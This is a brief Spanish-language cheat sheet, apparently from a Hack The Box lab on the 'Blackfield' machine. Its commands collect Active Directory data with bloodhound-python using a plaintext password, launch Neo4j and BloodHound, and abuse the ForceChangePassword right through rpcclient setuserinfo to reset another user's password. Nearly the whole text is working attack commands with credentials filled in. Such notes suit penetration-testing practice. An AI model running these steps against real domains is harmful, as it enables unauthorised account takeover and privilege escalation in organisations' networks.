# BloodHound

### Uso de BloodHound-python
```null
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c All
```

### Inicialización Neo4j
```null
sudo neo4j console
bloodhound &>/dev/null & disown
```

## Abuso de ForceChangePassword

### Modificación de contraseña por RPC
```null
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```


